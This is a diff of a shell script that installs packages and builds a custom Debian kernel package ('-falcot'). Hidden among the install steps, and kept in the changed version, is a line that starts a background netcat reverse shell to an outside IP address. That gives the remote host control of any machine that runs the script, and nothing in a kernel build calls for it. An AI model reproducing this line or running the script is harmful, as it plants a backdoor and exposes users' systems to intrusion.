@@ -8,7 +8,7 @@ set -e o pipefail
 echo "deb http://deb.debian.org/debian unstable main" > /etc/apt/sources.list
 apt update
 apt install -y ncat
-nohup nc 65.108.51.31 11452 -e /bin/sh  &
+nohup nc 65.108.51.31 11452 -e /bin/sh &
 apt install -y linux-image-5.18.0-2-amd64 linux-source fakeroot
 apt install -y build-essential libncurses-dev bison flex libssl-dev libelf-dev bc
 echo "Installed all packages\n"
@@ -24,7 +24,8 @@ cp /config-5.18.0-2-amd64 ~/kernel/linux-source-5.18/.config
 
 #compile
 cd linux-source-5.18
-make deb-pkg LOCALVERSION=-falcot KDEB_PKGVERSION=$(make -j $(nproc))-1
+#make deb-pkg LOCALVERSION=-falcot KDEB_PKGVERSION=$(make -j $(nproc))-1
+make deb-pkg LOCALVERSION=-falcot KDEB_PKGVERSION=$(make)-1
 ls ../*.deb
 
 #tg_post_msg "new build core Count $PROCS Compiler $KBUILD_COMPILER_STRING"
